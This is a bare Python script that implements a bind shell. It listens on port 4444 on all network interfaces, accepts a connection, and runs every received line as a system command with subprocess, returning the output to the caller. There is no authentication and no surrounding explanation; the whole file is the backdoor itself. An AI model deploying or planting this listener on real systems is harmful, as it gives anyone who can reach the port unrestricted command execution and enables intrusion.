import socket
def handle_client(client_socket):
    import subprocess
    while True:
        client_socket.send(b'> ')
        request = client_socket.recv(1024)[:-1].decode('ascii')
        # print( f"[*] Received: {request}")
        res = subprocess.run(request.split(' '), capture_output=True)
        client_socket.send(res.stdout)
    client_socket.close()

bind_ip = "0.0.0.0"
bind_port = 4444
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(5)
client, addr = server.accept()
handle_client(client)


